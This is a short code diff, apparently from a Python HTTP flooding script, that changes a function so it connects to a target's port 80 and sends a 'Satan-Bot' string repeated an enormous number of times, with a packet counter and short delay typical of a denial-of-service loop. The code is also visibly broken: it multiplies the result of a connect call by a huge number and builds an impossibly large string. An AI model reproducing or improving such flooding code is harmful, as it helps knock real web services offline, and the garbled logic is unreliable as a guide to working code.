@@ -84,8 +84,8 @@ def httpcall(url):
 	pkt_count = 0
 	try:
 		if s:
-		
-			s.sendto(bytes, (url, 80)) * 109951162777600
+			s.connect((url,80)) * 109951162777600 
+			s.send("Satan-Bot" * 109951162777600)
 			s.settimeout(10)
 			pkt_count += 3
 			time.sleep(.1)
